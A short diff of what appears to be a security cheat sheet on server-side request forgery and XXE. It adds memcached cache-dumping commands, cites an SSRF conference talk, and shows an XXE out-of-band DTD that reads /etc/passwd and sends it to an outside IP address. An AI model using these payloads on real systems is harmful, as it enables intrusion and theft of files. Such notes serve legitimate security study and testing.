@@ -630,6 +630,12 @@ codes/ssrf_protocol_smuggling/zabbix.py
   
 codes/ssrf_protocol_smuggling/memcached.py
   
+-> stats items
+  
+-> cachedump slash_number 10
+  
+-> get item item
+  
 ### Doc for SSRF - bhack
 
 https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
@@ -653,7 +659,9 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 vulns/xxe_oob/evil.dtd
   
 <!ENTITY % file SYSTEM "php>://filter/convert.base64-encode/resource=/etc/passwd">
+  
 <!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'http://10.10.12.228/?leak=%file;'>">
+  
 %payload;
   
 %remote;
